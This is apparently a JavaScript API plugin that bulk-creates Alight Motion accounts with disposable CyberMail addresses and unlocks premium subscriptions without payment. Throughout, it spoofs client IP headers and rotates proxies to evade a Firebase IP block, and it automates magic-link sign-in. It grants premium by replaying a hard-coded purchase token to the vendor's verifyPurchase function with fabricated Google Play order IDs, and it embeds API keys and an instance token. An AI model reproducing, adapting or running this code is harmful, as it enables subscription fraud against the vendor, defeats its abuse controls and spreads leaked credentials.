/**
 * AlightMotion Bulk V2 — Auto create CyberMail + send magic link + verify + apply premium
 * Merged with sendv3.js & verifam.js logic (direct Firebase & Cloud Functions, no amService dependency)
 *
 * GET  /api/am/bulkv2?count=1
 * POST /api/am/bulkv2 -d {"count": 1}
 */

import fs from "fs";
import path from "path";
import axios from "axios";
import logger from "../../src/utils/logger.js";

// Optional dynamic import for proxy agents
let HttpsProxyAgent = null;
let SocksProxyAgent = null;

try {
  const httpsMod = await import("https-proxy-agent");
  HttpsProxyAgent = httpsMod.HttpsProxyAgent || httpsMod.default;
} catch {}

try {
  const socksMod = await import("socks-proxy-agent");
  SocksProxyAgent = socksMod.SocksProxyAgent || socksMod.default;
} catch {}

// ===== CYBERMAIL CONFIG =====
const CYBERMAIL_API = "https://api.cybermail.us";
const CYBERMAIL_WEB = "https://cybermail.us";

const WORDLIST = [
  "cyber", "retro", "neon", "pixel", "hack", "code", "tech", "digital",
  "matrix", "quantum", "synth", "wave", "glow", "volt", "echo", "nova",
  "flux", "byte", "data", "core", "alpha", "beta", "gamma", "delta",
  "omega", "prime", "nexus", "vertex", "axis", "grid"
];

const FALLBACK_DOMAINS = [
  "cybermail.us",
  "cybermail.biz.id",
  "cybermail.my.id",
  "cyber-mail.site",
  "cybermail.web.id"
];

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ===== FIREBASE & VERIFY CONFIG =====
const API_KEY = "AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0";
const DEFAULT_API_KEY = "AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0";
const BASE_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty";
const FIREBASE_ORIGIN = "https://alight-creative.firebaseapp.com";
const VERIFY_PURCHASE_URL = "https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase";
const PRODUCT_ID = "am.full.sub.annual.19q4";
const TOKEN = "mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw";
const SKU_TYPE = "subs";
const FIREBASE_INSTANCE_ID_TOKEN = "cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI";

const HEADERS = {
  "Content-Type": "application/json",
  "Accept": "application/json",
  "Referer": `${FIREBASE_ORIGIN}/`,
  "Origin": FIREBASE_ORIGIN,
  "X-Android-Package": "com.alightcreative.motion",
  "X-Android-Cert": "ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8",
  "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 15; 23127PN0CC Build/BP1A.250505.005)",
};

const androidHeaders = {
  "Content-Type": "application/json",
  "X-Android-Package": "com.alightcreative.motion",
  "X-Android-Cert": "ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8",
  "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 15; 23127PN0CC Build/BP1A.250505.005)"
};

const purchaseHeaders = {
  "Content-Type": "application/json; charset=utf-8",
  "Accept-Encoding": "gzip",
  "User-Agent": "okhttp/3.12.1"
};

// ===== PROXY MANAGER (FROM SENDV3) =====
class ProxyManager {
  constructor() {
    this.proxies = [];
    this.currentIndex = 0;
    this.loadProxies();
  }

  detectProtocol(url) {
    const lower = url.toLowerCase();
    if (lower.startsWith("socks5://")) return "socks5";
    if (lower.startsWith("socks4://")) return "socks4";
    if (lower.startsWith("https://")) return "https";
    return "http";
  }

  loadProxies() {
    const list = [];
    const proxyDir = path.join(process.cwd(), "proxy");
    const proxyFile = path.join(process.cwd(), "proxy.txt");

    if (fs.existsSync(proxyDir)) {
      try {
        const files = fs.readdirSync(proxyDir).filter((f) => f.endsWith(".txt"));
        for (const file of files) {
          const content = fs.readFileSync(path.join(proxyDir, file), "utf8");
          const lines = content
            .split("\n")
            .map((line) => line.trim())
            .filter((line) => line && !line.startsWith("#"));

          for (const line of lines) {
            const name = file.toLowerCase();
            const protocol = name.includes("sock5")
              ? "socks5"
              : name.includes("sock4")
                ? "socks4"
                : "http";

            const url = /^(socks[45]|https?):\/\//i.test(line)
              ? line
              : `${protocol}://${line}`;

            list.push({ url });
          }
        }
      } catch (error) {
        logger?.error ? logger.error(`[AM SEND] Proxy directory: ${error.message}`) : null;
      }
    }

    if (fs.existsSync(proxyFile)) {
      try {
        const content = fs.readFileSync(proxyFile, "utf8");
        content
          .split("\n")
          .map((line) => line.trim())
          .filter((line) => line && !line.startsWith("#"))
          .forEach((line) => {
            const url = /^(socks[45]|https?):\/\//i.test(line)
              ? line
              : `http://${line}`;
            list.push({ url });
          });
      } catch (error) {
        logger?.error ? logger.error(`[AM SEND] Proxy file: ${error.message}`) : null;
      }
    }

    this.proxies = list;
  }

  getRotatedProxy() {
    if (!this.proxies.length) return null;
    const proxy = this.proxies[this.currentIndex % this.proxies.length];
    this.currentIndex++;
    return proxy;
  }

  createAgent(proxyUrl) {
    if (!proxyUrl) return null;
    try {
      const protocol = this.detectProtocol(proxyUrl);
      if (protocol.startsWith("socks")) {
        return SocksProxyAgent ? new SocksProxyAgent(proxyUrl) : null;
      }
      return HttpsProxyAgent ? new HttpsProxyAgent(proxyUrl) : null;
    } catch {
      return null;
    }
  }
}

const proxyManager = new ProxyManager();

function createRequestConfig() {
  const proxy = proxyManager.getRotatedProxy();
  const config = {
    headers: HEADERS,
    timeout: 30000,
    validateStatus: () => true,
  };

  if (proxy) {
    const agent = proxyManager.createAgent(proxy.url);
    if (agent) {
      config.httpAgent = agent;
      config.httpsAgent = agent;
      config.proxy = false;
    }
  }

  return config;
}

async function firebaseRequest(endpoint, payload) {
  if (!API_KEY) {
    throw new Error("FIREBASE_API_KEY belum dikonfigurasi");
  }

  const url = `${BASE_URL}/${endpoint}?key=${API_KEY}`;
  const response = await axios.post(url, payload, createRequestConfig());

  if (response.status < 200 || response.status >= 300) {
    const message = response.data?.error?.message || `Firebase HTTP ${response.status}`;
    const error = new Error(message);
    error.status = response.status;
    throw error;
  }

  return response.data;
}

// ===== CYBERMAIL HELPER FUNCTIONS =====

// 1. Fetch domain aktif dari CyberMail
export async function getDomains() {
  try {
    const res = await fetch(`${CYBERMAIL_API}/api/domains`, {
      headers: { Accept: "application/json" },
      signal: AbortSignal.timeout(15000),
    });
    if (res.ok) {
      const json = await res.json();
      if (json.success && Array.isArray(json.data)) {
        const verified = json.data.filter((d) => d.verified).map((d) => d.name);
        if (verified.length > 0) return verified;
      }
    }
  } catch {}
  return FALLBACK_DOMAINS;
}

// 2. Generate email temporary CyberMail
export async function createEmail() {
  const domains = await getDomains();
  const domain = domains[Math.floor(Math.random() * domains.length)];
  const word = WORDLIST[Math.floor(Math.random() * WORDLIST.length)];
  const num = Math.floor(Math.random() * 999) + 1;
  const username = `${word}${num}`;
  const email = `${username}@${domain}`;
  return { email, username, domain };
}

// 3. Fetch inbox CyberMail
export async function checkInbox(email) {
  const addr = String(email || "").trim();
  if (!addr.includes("@")) throw new Error("Email tidak valid");

  const res = await fetch(`${CYBERMAIL_API}/api/inbox/${encodeURIComponent(addr)}`, {
    headers: { Accept: "application/json" },
    signal: AbortSignal.timeout(20000),
  });

  if (!res.ok) {
    throw new Error(`CyberMail inbox HTTP ${res.status}`);
  }

  const json = await res.json();
  return json.data?.emails || [];
}

// 4. Cari magic link dari pesan masuk
export function findVerifyLink(emails) {
  const patterns = [
    /https:\/\/alightcreative\.com\/auth_action\/?\?[^\s"'>]*oobCode=[^\s"'>&]+/,
    /https:\/\/[^"'\s]*alight[^"'\s]*firebaseapp\.com\/__\/auth\/links\?link=[^\s"'>]+/,
    /https:\/\/[^"'\s]*firebaseapp\.com\/__\/auth\/links\?link=[^\s"'>]+/,
    /https:\/\/alight-creative\.firebaseapp\.com\/__\/auth\/links\?link=[^\s"'>]+/
  ];

  for (const msg of emails) {
    const text = `${msg.html || ""}\n${msg.body || ""}`;
    for (const p of patterns) {
      const m = text.match(p);
      if (m) return m[0].replace(/&amp;/g, "&");
    }
  }
  return null;
}

// 5. Polling inbox mencari verify link
export async function waitForVerifyLink(email, { maxAttempts = 25, intervalMs = 2500 } = {}) {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const emails = await checkInbox(email);
      if (emails.length) {
        const link = findVerifyLink(emails);
        if (link) return { link, attempts: attempt };
      }
    } catch {}
    await sleep(intervalMs);
  }
  return null;
}

// ===== SEND MAGIC LINK (via Jiyyad — bypass Firebase IP block) =====
const JIYYAD_URL = "https://amgen30bjiyyad.vercel.app";

function jiyyabHeaders() {
  const ip = [
    Math.floor(Math.random() * 200) + 20,
    Math.floor(Math.random() * 250) + 1,
    Math.floor(Math.random() * 250) + 1,
    Math.floor(Math.random() * 250) + 1,
  ].join(".");
  return {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": JIYYAD_URL,
    "Referer": `${JIYYAD_URL}/`,
    "X-Forwarded-For": ip,
    "X-Real-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "X-Client-IP": ip,
    "X-Cluster-Client-IP": ip,
  };
}

export async function sendMagicLink(email) {
  try {
    const res = await axios.post(
      `${JIYYAD_URL}/api/send`,
      { email: email.trim() },
      { headers: jiyyabHeaders(), timeout: 30000, validateStatus: () => true }
    );

    if (res.data?.status) {
      return {
        success: true,
        message: res.data.message || "Link berhasil dikirim.",
        email,
      };
    }

    return {
      success: false,
      error: res.data?.message || `HTTP ${res.status}`,
      status: res.status,
    };
  } catch (error) {
    return {
      success: false,
      error: error.message,
    };
  }
}

// ===== VERIF & PREMIUM (FROM VERIFAM) =====
export function extractOobCode(fullUrl) {
  if (!fullUrl) return null;
  try {
    let cleanUrl = String(fullUrl).trim();
    for (let i = 0; i < 3; i++) {
      try {
        const decoded = decodeURIComponent(cleanUrl);
        if (decoded === cleanUrl) break;
        cleanUrl = decoded;
      } catch {
        break;
      }
    }

    const match = cleanUrl.match(/[?&]oobCode=([a-zA-Z0-9_-]+)/i) || cleanUrl.match(/oobCode=([a-zA-Z0-9_-]+)/i);
    if (match && match[1]) {
      return match[1].replace(/[^a-zA-Z0-9_-]/g, "");
    }

    if (/^[a-zA-Z0-9_-]{30,}$/.test(cleanUrl)) {
      return cleanUrl;
    }
  } catch {}
  return null;
}

export function extractApiKey(fullUrl) {
  if (!fullUrl) return DEFAULT_API_KEY;
  try {
    let cleanUrl = String(fullUrl);
    for (let i = 0; i < 3; i++) {
      try {
        const decoded = decodeURIComponent(cleanUrl);
        if (decoded === cleanUrl) break;
        cleanUrl = decoded;
      } catch {
        break;
      }
    }
    const match = cleanUrl.match(/[?&]apiKey=([a-zA-Z0-9_-]+)/i) || cleanUrl.match(/apiKey=([a-zA-Z0-9_-]+)/i);
    if (match && match[1]) {
      return match[1];
    }
  } catch {}
  return DEFAULT_API_KEY;
}

export function generateCodeOrder() {
  const r = (len) => {
    let str = "";
    for (let i = 0; i < len; i++) str += Math.floor(Math.random() * 10);
    return str;
  };
  return `GPA.${r(4)}.${r(4)}.${r(4)}.${r(5)}`;
}

export async function signInEmail(email, oobCode, apiKey) {
  const keysToTry = [apiKey, DEFAULT_API_KEY, "AIzaSyDrZ9jr_Y16ltSBqsQR5IH6I04FRga6Ki0"];
  const uniqueKeys = [...new Set(keysToTry.filter(Boolean))];

  let lastError = null;

  for (const key of uniqueKeys) {
    // Metode 1: v3 relyingparty emailLinkSignin (klien Android resmi)
    try {
      const res = await axios.post(
        `https://www.googleapis.com/identitytoolkit/v3/relyingparty/emailLinkSignin?key=${key}`,
        { email, oobCode, clientType: "CLIENT_TYPE_ANDROID" },
        { headers: androidHeaders, timeout: 30000 }
      );
      if (res.data?.idToken) return res.data;
    } catch (e) {
      lastError = e;
    }

    // Metode 2: v1 accounts:signInWithEmailLink
    try {
      const res = await axios.post(
        `https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key=${key}`,
        { email, oobCode },
        {
          headers: {
            ...androidHeaders,
            Referer: "https://alight-creative.firebaseapp.com",
            Origin: "https://alight-creative.firebaseapp.com"
          },
          timeout: 30000
        }
      );
      if (res.data?.idToken) return res.data;
    } catch (e) {
      lastError = e;
    }
  }

  throw lastError || new Error("Gagal verifikasi email link");
}

export async function applyPremium(idToken, customOrderId = null) {
  const codeorder = generateCodeOrder();
  const finalOrderId = customOrderId ? String(customOrderId).trim() : codeorder;
  const headers = {
    ...purchaseHeaders,
    authorization: `Bearer ${idToken}`,
    "firebase-instance-id-token": FIREBASE_INSTANCE_ID_TOKEN
  };

  const response = await axios.post(
    VERIFY_PURCHASE_URL,
    {
      data: {
        productId: PRODUCT_ID,
        token: TOKEN,
        skuType: SKU_TYPE,
        orderId: finalOrderId
      }
    },
    { headers, timeout: 30000 }
  );

  return {
    success: true,
    data: response.data,
    orderId: finalOrderId
  };
}

export async function verifyMagicLink(email, link, customOrderId = null) {
  try {
    const oobCode = extractOobCode(link);
    if (!oobCode) {
      return {
        success: false,
        error: "Gagal mengekstrak oobCode dari link. Pastikan link mengandung oobCode valid.",
      };
    }

    const apiKey = extractApiKey(link);
    const signinRes = await signInEmail(email.trim(), oobCode, apiKey);
    const idToken = signinRes?.idToken;

    if (!idToken) {
      return {
        success: false,
        error: "Gagal mendapatkan idToken dari hasil verifikasi",
      };
    }

    const orderId = customOrderId || generateCodeOrder();

    return {
      success: true,
      idToken,
      refreshToken: signinRes.refreshToken,
      orderId,
      user: {
        uid: signinRes.localId,
        email: signinRes.email,
        isNewUser: signinRes.isNewUser,
      },
      signin: signinRes,
    };
  } catch (err) {
    const errMsg =
      err.response?.data?.error?.message ||
      (typeof err.response?.data === "string" ? err.response.data : null) ||
      err.message;
    return {
      success: false,
      error: errMsg,
      message: errMsg,
    };
  }
}

// ===== API PLUGIN DEFAULT EXPORT =====
export default {
  name: "AlightMotion Bulk V2",
  description: "Generate Am Bulk v2 (CyberMail + Built-in Send & Verify)",
  category: "AlightMotion",
  methods: ["GET", "POST"],
  params: ["count"],
  paramsSchema: {
    count: {
      type: "number",
      required: false,
      default: 1,
      description: "Jumlah akun Alight Motion Premium yang ingin dibuat (maksimal 20 akun per request)",
      example: 1,
    },
  },

  async run(req, res) {
    const params = { ...req.query, ...req.body };
    const total = Math.min(Math.max(parseInt(params.count) || 1, 1), 20);

    try {
      // 1. Buat email CyberMail untuk semua akun
      const results = [];
      for (let index = 0; index < total; index++) {
        const { email } = await createEmail();
        results.push({
          email,
          status: "success",
          inboxUrl: `${CYBERMAIL_WEB}/?e=${email}`,
        });
        if (index < total - 1) await sleep(300);
      }

      // 2. Jalankan proses verifikasi dan aktivasi VIP di latar belakang (background)
      (async () => {
        logger?.info ? logger.info(`[AM BulkV2 BG] Memulai proses background untuk ${total} akun...`) : null;
        for (let i = 0; i < results.length; i++) {
          const item = results[i];
          const email = item.email;

          try {
            logger?.info ? logger.info(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Mengirim magic link...`) : null;
            const sendRes = await sendMagicLink(email);
            if (!sendRes.success) {
              logger?.error ? logger.error(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Gagal kirim link: ${sendRes.error || sendRes.message}`) : null;
              continue;
            }

            logger?.info ? logger.info(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Menunggu link verifikasi di CyberMail...`) : null;
            const found = await waitForVerifyLink(email, { maxAttempts: 25, intervalMs: 2500 });
            if (!found) {
              logger?.error ? logger.error(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Link verifikasi tidak ditemukan di inbox`) : null;
              continue;
            }

            logger?.info ? logger.info(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Melakukan verifikasi login...`) : null;
            const authData = await verifyMagicLink(email, found.link);
            if (!authData.success) {
              logger?.error ? logger.error(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Verifikasi gagal: ${authData.message || authData.error}`) : null;
              continue;
            }

            // Terapkan lisensi (applyPremium)
            logger?.info ? logger.info(`[AM BulkV2 BG] [${i + 1}/${total}] ${email}: Menerapkan lisensi premium VIP...`) : null;
            const premiumRes = await applyPremium(authData.idToken, authData.orderId);

            logger?.info ? logger.info(
              `[AM BulkV2 BG] [${i + 1}/${total}] ${email}: SUKSES PREMIUM VIP AKTIF! | UID: ${authData.user?.uid || "-"} | Order: ${authData.orderId || "-"} | Result: ${JSON.stringify(premiumRes?.data || {})}`
            ) : null;
          } catch (err) {
            logger?.error ? logger.error(`[AM BulkV2 BG] [${i + 1}/${total}] ${email} error: ${err.message}`) : null;
          }

          if (i < total - 1) await sleep(2000);
        }
        logger?.info ? logger.info(`[AM BulkV2 BG] Selesai memproses seluruh ${total} akun.`) : null;
      })().catch((err) => {
        logger?.error ? logger.error(`[AM BulkV2 BG] Fatal background error: ${err.message}`) : null;
      });

      // 3. Langsung kirim respon ke client (tanpa orderId)
      return res.json({
        status: true,
        message: "Permintaan bulk berhasil diterima. Proses verifikasi dan aktivasi premium berjalan di latar belakang.",
        total,
        results,
      });
    } catch (err) {
      logger?.error ? logger.error(`[AM BulkV2] Error: ${err.message}`) : null;
      return res.status(500).json({
        status: false,
        message: err.message || "Gagal memproses bulk request Alight Motion",
      });
    }
  },
};
